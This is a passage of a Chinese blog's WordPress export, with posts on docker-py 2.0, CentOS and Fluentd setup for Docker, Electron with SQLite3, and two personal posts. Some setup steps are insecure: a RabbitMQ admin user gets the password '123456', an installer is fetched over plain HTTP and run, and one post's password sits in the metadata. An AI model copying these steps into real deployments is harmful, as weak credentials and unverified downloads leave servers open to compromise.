		<pubDate>Tue, 03 Jan 2017 09:25:10 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1659</guid>
		<description></description>
		<content:encoded><![CDATA[...期末事多，博客都忘了...
docker-py升级到了 2.0 版本，功能变化不算很大，使用方法倒是变了一圈，以前使用 Client 方法链接 Docker ，现在可以使用 DockerClient 远程链接，也能使用 docker 提供的 from_env() 链接本地 Docker。
问题是 2.0 之前的代码，直接把 Client 改成 DockerClient 或者 from_env() 都无法正常运行，因为 2.0 把所有方法调用都变了，例如旧版本创建容器如下：

<pre>import docker
client = docker.Client(base_url='unix:///var/run/docker.sock', timeout=10)
client.create_container(…)</pre>

新版本：

<pre>import docker
client = docker.from_env()
client.containers.run(…)</pre>

但不想动以前的代码就能运行，docker-py 2.0 还提供了 APIClient 方法来链接 Docker，APIClient 也就是旧版本的 Client 方法，保证了兼容性。
&nbsp;
笔记一下 run() 常用的几个参数：

<ul class="first simple">
    <li><strong>image</strong> (<em>str</em>) – 指定一个 image ，如镜像不存在，则抛出 docker.errors.ImageNotFound 错误。</li>
    <li><strong>command</strong> (<em>str or list</em>) – 容器要运行的命令。</li>
    <li><strong>hostname</strong> (<em>str</em>) – 设置容器的 hostname。</li>
    <li><strong>name</strong> (<em>str</em>) – 设置容器的 名称，如不设置，则由 Docker 随机生成。</li>
    <li><strong>dns</strong> (<i>list</i>) – 为容器设置自定义 DNS 服务器。</li>
    <li><strong>links</strong> (<em>dict or list of tuples</em>) – 用于链接其他容器协同工作。</li>
    <li><strong>mem_limit</strong> (<em>str or int</em>) – 内存限制，例如 (100000b, 1000k, 128m, 1g)。</li>
    <li><strong>network_mode</strong> (<em>str</em>) –
<ul>
    <li><code><span class="pre">bridge</span></code> 默认网络。</li>
    <li><code><span class="pre">none</span></code> 无网络。</li>
    <li><code><span class="pre">container:&lt;name|id&gt;</span></code> 单独链接容器。</li>
    <li><code><span class="pre">host</span></code> host 模式网络。</li>
</ul>
</li>
    <li><strong>ports</strong> (<em>dict</em>) –绑定、映射端口（下次再翻译下...）。
The keys of the dictionary are the ports to bind inside the container, either as an integer or a string in the form <code><span class="pre">port/protocol</span></code>, where the protocol is either <code><span class="pre">tcp</span></code> or <code><span class="pre">udp</span></code>.
The values of the dictionary are the corresponding ports to open on the host, which can be either:
<ul>
    <li>The port number, as an integer. For example, <code><span class="pre">{'2222/tcp':</span> <span class="pre">3333}</span></code>will expose port 2222 inside the container as port 3333 on the host.</li>
    <li><code><span class="pre">None</span></code>, to assign a random host port. For example, <code><span class="pre">{'2222/tcp':</span><span class="pre">None}</span></code>.</li>
    <li>A tuple of <code><span class="pre">(address,</span> <span class="pre">port)</span></code> if you want to specify the host interface. For example, <code><span class="pre">{'1111/tcp':</span> <span class="pre">('127.0.0.1',</span> <span class="pre">1111)}</span></code>.</li>
    <li>A list of integers, if you want to bind multiple host ports to a single container port. For example, <code><span class="pre">{'1111/tcp':</span> <span class="pre">[1234,</span> <span class="pre">4567]}</span></code>.</li>
</ul>
</li>
    <li><strong>remove</strong> (<em>bool</em>) – 容器运行完毕后删除。</li>
</ul>

待续...]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1659</wp:post_id>
		<wp:post_date><![CDATA[2017-01-03 17:25:10]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2017-01-03 09:25:10]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[docker-py-2-0-%e6%96%b0%e5%bb%ba%e5%ae%b9%e5%99%a8%e5%8f%82%e6%95%b0%e7%ac%94%e8%ae%b0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="docker-py"><![CDATA[Docker-py]]></category>
		<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[93]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>CentOS 7.0 配置 DockerM Web 环境</title>
		<link>https://www.nervgeek.com/2017/02/14/centos-7-0-%e9%85%8d%e7%bd%ae-dockerm-web-%e7%8e%af%e5%a2%83/</link>
		<pubDate>Tue, 14 Feb 2017 05:50:38 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1669</guid>
		<description></description>
		<content:encoded><![CDATA[<span style="font-size: 18pt;">一、安装 Docker</span>
1、安装 yum-utils

<pre> sudo yum <span class="hljs-keyword">install</span> -y yum-utils</pre>

&nbsp;
2、设置 yum 使用稳定的 repository

<pre>yum-config-manager <span class="se">\</span>
--add-repo <span class="se">\</span>
https:<span class="hljs-comment">//docs.docker.com/engine/installation/linux/repo_files/centos/docker.repo</span></pre>

&nbsp;
3、创建缓存

<pre>yum makecache fast</pre>

&nbsp;
4、安装 Docker

<pre>yum -y <span class="hljs-keyword">install</span> docker-<span class="hljs-keyword">engine</span></pre>

&nbsp;
&nbsp;
<span style="font-size: 18pt;">二、安装 Rabbit MQ</span>
1、安装 Erlang

<pre>yum install erlang</pre>

&nbsp;
2、安装 Rabbit MQ

<pre>yum install rabbitmq-server</pre>

&nbsp;
<!--more-->
<span style="font-size: 18pt;">三、安装 Lnmp</span>
&nbsp;
1、一键安装

<pre>wget -c http://soft.vpser.net/lnmp/lnmp1.3-full.tar.gz &amp;&amp; tar zxf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full &amp;&amp; ./install.sh lnmp</pre>

&nbsp;
&nbsp;
<span style="font-size: 18pt;">四、安装 SaltStack</span>
1、安装 Salt-master

<pre>yum install salt-master</pre>

&nbsp;
&nbsp;
<span style="font-size: 18pt;">五、配置 Rabbit MQ</span>

<pre><span class="pln"># 启动 rabbitmq 服务器
service rabbitmq-server start
# 新增 vhost
rabbitmqctl add_vhost dockerm_vhost
</span>
# 新增用户并配置密码
<span class="pln">rabbitmqctl add_user dockerm </span><span class="lit">123456</span>
# vhost权限
<span class="pln">rabbitmqctl set_permissions </span><span class="pun">-</span><span class="pln">p </span><span class="str">"dockerm_vhost"</span><span class="pln"> dockerm </span><span class="str">".*"</span> <span class="str">".*"</span> <span class="str">".*"</span>
# 给予用户管理员权限
<span class="pln">rabbitmqctl set_user_tags dockerm administrator
# 启动 web 监控插件，通过 http://ip:15672 访问
rabbitmq-plugins enable rabbitmq_management
</span></pre>

&nbsp;
&nbsp;
六、配置 Salt-master

<pre># 启动 salt-master
service salt-master start
vi /etc/salt/master
# 去掉 interface 前的井号,把 0.0.0.0 修改为 salt-master 主机的 ip</pre>

&nbsp;
&nbsp;
七、安装 python 库
2、MySQLdb
有点难装的库，通过git下载安装

<pre># git 拉下来
git clone https://github.com/farcepest/MySQLdb1.git
cd MySQLdb1
# !!!这里很有可能会报找不到 mysql_config
python setup.py bulid
# 先找出 mysql_config 实际地址
find / -name mysql_config
(我的在/usr/local/mysql/bin/mysql_config)
# 修改 setup_posix.py
# 找到 mysql_config.path = "mysql_config"
# 修改为 mysql_config.path = "/usr/local/mysql/bin/mysql_config(我的地址)"
# 再执行
python setup.py build
# 安装
python setup.py install</pre>

&nbsp;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1669</wp:post_id>
		<wp:post_date><![CDATA[2017-02-14 13:50:38]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2017-02-14 05:50:38]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[centos-7-0-%e9%85%8d%e7%bd%ae-dockerm-web-%e7%8e%af%e5%a2%83]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="dockerm"><![CDATA[DockerM]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="post_tag" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_142bd976955a237c001f26d7ead802e7]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[6]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_content_score]]></wp:meta_key>
		<wp:meta_value><![CDATA[60]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_primary_category]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Ubuntu 16.04 配置 Fluentd 收集 Docker 容器日志保存到 Mongodb</title>
		<link>https://www.nervgeek.com/2017/04/18/ubuntu-16-04-%e9%85%8d%e7%bd%ae-fluentd-%e6%94%b6%e9%9b%86-docker-%e5%ae%b9%e5%99%a8%e6%97%a5%e5%bf%97%e5%b9%b6%e4%bf%9d%e6%8c%81%e8%87%b3-mongodb/</link>
		<pubDate>Tue, 18 Apr 2017 01:18:19 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=2689</guid>
		<description></description>
		<content:encoded><![CDATA[一个容器运行起来，我们判断容器是否正常运行，一般都是去查看日志。默认 Docker 产生的日志文件都保持在本机， Ubuntu 下 Docker 保存路径是 /var/lib/docker/contaiers/&lt;container_id&gt;/&lt;container_id&gt;-json.log，其中 -json 表示该日志已经格式化为 json 格式，方便读取。
但假如我们的 Docker 节点成百上千，那人工去定位日志是非常消耗时间的，我们这个时间可以利用集中化日志系统来处理众多 Docker 容器产生的日志。
现在流行的日志处理系统有 ELK（elasticsearch、Logstash、kibana） 和 EFK（elasticsearch、fluent/flume、kibana） 。都是非常成熟，经过多个项目严格考验的优秀架构。
但我个人使用的话，节点不多，所以只用到 Fluent ，数据存储到 Mongodb ，只做展示使用。
<!--more-->
环境：Ubuntu 16.04
软件源：阿里云
&nbsp;
<strong><span style="font-size: 18pt;">一、安装 Ruby</span></strong>
Fluent 是基于 Ruby 开发，所以第一步需要安装 Ruby，执行：

<pre>apt-get install ruby</pre>

执行 ruby -v 查看版本，2.x 版本即可。
&nbsp;
<strong><span style="font-size: 18pt;">二、安装 Rubygems</span></strong>
gem 类似于 Python 的包管理器 pip、easy_install。是用来安装 Ruby 第三方库且自动解决依赖问题。

<pre>wget https://rubygems.org/rubygems/rubygems-2.6.11.tgz
tar -zxvf rubygems-2.6.11.tgz
cd rubygems-2.6.11/
ruby setup.rb install
gem -v</pre>

&nbsp;
<strong><span style="font-size: 18pt;">三、安装 Fluent</span></strong>

<pre>wget http://packages.treasuredata.com.s3.amazonaws.com/2/ubuntu/xenial/pool/contrib/t/td-agent/td-agent_2.3.4-0_amd64.deb
dpkg -i td-agent_2.3.4-0_amd64.deb</pre>

&nbsp;
<strong><span style="font-size: 18pt;">四、安装 Mongodb</span></strong>

<pre>apt-get install mongodb</pre>

&nbsp;
<strong><span style="font-size: 18pt;">五、安装 Fluent-plugin-mongo</span></strong>
官方教程是直接 fluent-gem install fluent-plugin-mongo，但我发现安装好 Fluent 之后，并找不到这个命令，所以先用 find / name fluent-gem 找一下，发现他藏在 /opt/td-agent/embedded/bin/fluent-gem ，直接使用它安装插件。（安装报错的同学一般都是没有安装 C 的编译器，执行一下 apt-get install make gcc g++
）

<pre>/opt/td-agent/embedded/bin/fluent-gem install fluent-plugin-mongo</pre>

&nbsp;
<strong><span style="font-size: 18pt;">六、配置 Fluent 对接 Mongodb</span></strong>
首先进入 Mongodb 新建数据库和表：

<pre>db.DatabaseName
# 创建数据库
db.createCollection(“TableName”)    
# 创建表</pre>

Fluent 的发行版叫 td-agent ，所以配置文件路径是 /etc/td-agent/td-agent.conf ，删除里面所有内容，添加以下配置：

<pre>&lt;source&gt;
  @type forward
  port 24224
  bind 0.0.0.0
&lt;/source&gt;
&lt;match *&gt;
  @type mongo
  host 127.0.0.1
  port 27017
  database DatabaseName
  collection TableName
  # for capped collection
  # capped
  # capped_size 1024m
  # authentication
  # user michael
  # password jordan
  # key name of timestamp
  time_key time
  # flush
  flush_interval 10s
&lt;/match&gt;</pre>

&nbsp;
<strong><span style="font-size: 18pt;">七、测试 Docker Log Driver ，日志保存到 Mongodb</span></strong>
（1）全局配置：

<pre>dockerd --log-driver=fluentd --log-opt fluentd-address=192.168.48.134:24224 &amp;</pre>

然后直接创建容器运行即可。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2689</wp:post_id>
		<wp:post_date><![CDATA[2017-04-18 09:18:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2017-04-18 01:18:19]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ubuntu-16-04-%e9%85%8d%e7%bd%ae-fluentd-%e6%94%b6%e9%9b%86-docker-%e5%ae%b9%e5%99%a8%e6%97%a5%e5%bf%97%e5%b9%b6%e4%bf%9d%e6%8c%81%e8%87%b3-mongodb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="category" nicename="fluent"><![CDATA[Fluent]]></category>
		<category domain="post_tag" nicename="fluent"><![CDATA[Fluent]]></category>
		<category domain="category" nicename="mongodb"><![CDATA[Mongodb]]></category>
		<category domain="post_tag" nicename="mongodb"><![CDATA[Mongodb]]></category>
		<category domain="category" nicename="ruby"><![CDATA[Ruby]]></category>
		<category domain="post_tag" nicename="ruby"><![CDATA[Ruby]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="category" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yst_is_cornerstone]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_content_score]]></wp:meta_key>
		<wp:meta_value><![CDATA[60]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_primary_category]]></wp:meta_key>
		<wp:meta_value><![CDATA[270]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>大学三年</title>
		<link>https://www.nervgeek.com/2017/05/17/%e5%a4%a7%e5%ad%a6%e4%b8%89%e5%b9%b4/</link>
		<pubDate>Wed, 17 May 2017 15:20:09 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=2764</guid>
		<description></description>
		<content:encoded><![CDATA[我的大学生活，准确来说只有两年半，还有半年时间是出来实习的。虽然时间不多，但我觉得大学三年经历过的事是初高中无法比拟的。当然，初高中所结交的朋友都是我人生中最重要的朋友。
我是靠单招考进河源职业技术学院的，按道理说那个时候的我的模拟考成绩，高考进河职院也是毫无问题的。但因为那个时候老师的安利，以及感觉自己高考进三本可能性太低，所以回家就用 “即使单招考进了，我也会努力高考争取三本的。” 这种欺骗父母的说法换取了去单招的机会。实际上我只是希望可以早早休暑假。
事情发展如我所愿，我顺利地考进了河职院，并为了在表面上保证父母的承诺 “努力高考” 天天正常回学校上课。但实际上我考完之后心态完全崩了，上课基本是摸鱼，自习课玩PSV和手机，高考我也是全程睡过去的。
休完了史上最长的暑假，到大一开学的日子，父母亲自驾车送我到学校（肇庆到河源真不算近），坐在父母的车上一直很担心之后的生活，毕竟是第一次外宿，满脑子的室友如何？室友是不是会有奇葩生活习惯？大学里交际是否特别复杂？
<img class="alignnone wp-image-2765" src="https://www.nervgeek.com/wp-content/uploads/2017/05/DSC_1129-e1495034235874.jpg" alt="" width="1440" height="810" />
办理了入学手续之后，到分宿舍的时候，领导发现宿舍不够分了，那个时候可把我给高兴坏了，因为我也有几个高中朋友也没宿舍。正打算让领导给我凑一块的时候，突然给我分配了个由两个专业混杂在一起的六人宿舍。心里直骂一句草泥马，但现在回想一下室友们都是很好的。
<img class="alignnone wp-image-2766" src="https://www.nervgeek.com/wp-content/uploads/2017/05/DSC_1138.jpg" alt="" width="1440" height="810" /> <img class="alignnone wp-image-2767" src="https://www.nervgeek.com/wp-content/uploads/2017/05/DSC_1140.jpg" alt="" width="1440" height="810" /> <img class="alignnone wp-image-2768" src="https://www.nervgeek.com/wp-content/uploads/2017/05/DSC_1142.jpg" alt="" width="1440" height="810" /> <img class="alignnone wp-image-2769" src="https://www.nervgeek.com/wp-content/uploads/2017/05/DSC_1144.jpg" alt="" width="1440" height="810" /> <img class="alignnone wp-image-2770" src="https://www.nervgeek.com/wp-content/uploads/2017/05/DSC_1143.jpg" alt="" width="1440" height="810" />
...]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2764</wp:post_id>
		<wp:post_date><![CDATA[2017-05-17 23:20:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2017-05-17 15:20:09]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%a4%a7%e5%ad%a6%e4%b8%89%e5%b9%b4]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[hzy]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_content_score]]></wp:meta_key>
		<wp:meta_value><![CDATA[60]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_primary_category]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>經紀日記「1」</title>
		<link>https://www.nervgeek.com/2017/11/08/%e7%b6%93%e7%b4%80%e6%97%a5%e8%a8%98%e3%80%8c1%e3%80%8d/</link>
		<pubDate>Wed, 08 Nov 2017 08:51:27 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=2808</guid>
		<description></description>
		<content:encoded><![CDATA[第 X 日
早上七時，被她叫醒，八時，到大同飲早茶，周二娘獨自囘家去了。她說自己要買鑽石，恐怕是「水盤」，大概和人家「踏路」是眞。王仔走來，「猛擦」一輪，揚長而去，眞是愈窮愈見鬼也。
九時半。打電話到貿易場問金價，仍是牛皮市，自從上月被綁，虧去六百元後，眞是見過鬼怕黑矣。莫伯到來，邀之同桌，據稱：昨日經手之透水碧玉，已由一西人買去，賺價二百餘元，此人好充大檯，未必能獲如是好價，逆料賺四五十元是眞。余素莫伯請飲早茶，彼一言既出。駟馬難追，這囘總算中計了。莫伯望望桌上的小碟，皺皺眉頭，我心裡好笑。
今日無甚門路，早茶後再囘新華睡覺，中午被電話驚醒，又是周二娘，她问我借五十元並說加入我不允，他就來坐索。與她約定下午三時來新華，她却要我請她到陸羽飲茶。
披衣到陸羽，途中遇見大班陳，我説等錢將軍，作了他一尺水。到陸羽，周二娘介紹了一陳姑娘相見，另細路一名，陳姑娘謂係其弟，細路無意中却叫起阿媽來。四個人擦了廿五元半，周二娘還要我買五塊錢點心帶囘家中。從儓底遞了五十塊錢給周二娘。倦極，再囘酒店睡覺。
五時退了房囘家，阿環話：「少奶昨晚打通宵麻雀沒囘來。」
老妻深夜才囘來，我因昨晚也沒有囘來家，心中有事，對她打通宵麻雀，沒有加以責難，衹問她<strong>XX</strong>如何，她説：衹拿了二十五塊錢本錢，却贏了三百多塊錢囘來。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2808</wp:post_id>
		<wp:post_date><![CDATA[2017-11-08 16:51:27]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2017-11-08 08:51:27]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e7%b6%93%e7%b4%80%e6%97%a5%e8%a8%98%e3%80%8c1%e3%80%8d]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_bj_lazy_load_skip_post]]></wp:meta_key>
		<wp:meta_value><![CDATA[false]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[netease]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Electron 使用 SQLite3 数据库</title>
		<link>https://www.nervgeek.com/2018/01/16/electron-%e4%bd%bf%e7%94%a8-sqlite3-%e6%95%b0%e6%8d%ae%e5%ba%93/</link>
		<pubDate>Tue, 16 Jan 2018 07:37:08 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=2831</guid>
		<description></description>
		<content:encoded><![CDATA[直接通过 npm install --save sqlite3 安装 sqlite3 是无法正常在 electron 上使用的，翻遍了很多教程，都是相对比较旧的，有些命令甚至在4.0之后都没有了。

直接贴上解决方法了：
<code>npm config set msvs_version 2015 --global</code>

然后在 package.json 添加：

<pre><code class="language-json line-numbers">"scripts": {
    "rebuild": "electron-rebuild -f -w sqlite3"
}
</code></pre>

然后在目录下执行:
<code>npm run rebuild</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2831</wp:post_id>
		<wp:post_date><![CDATA[2018-01-16 15:37:08]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-01-16 07:37:08]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[electron-%e4%bd%bf%e7%94%a8-sqlite3-%e6%95%b0%e6%8d%ae%e5%ba%93]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="electron"><![CDATA[Electron]]></category>
		<category domain="post_tag" nicename="sqlite3"><![CDATA[SQLite3]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_bj_lazy_load_skip_post]]></wp:meta_key>
		<wp:meta_value><![CDATA[false]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[netease]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
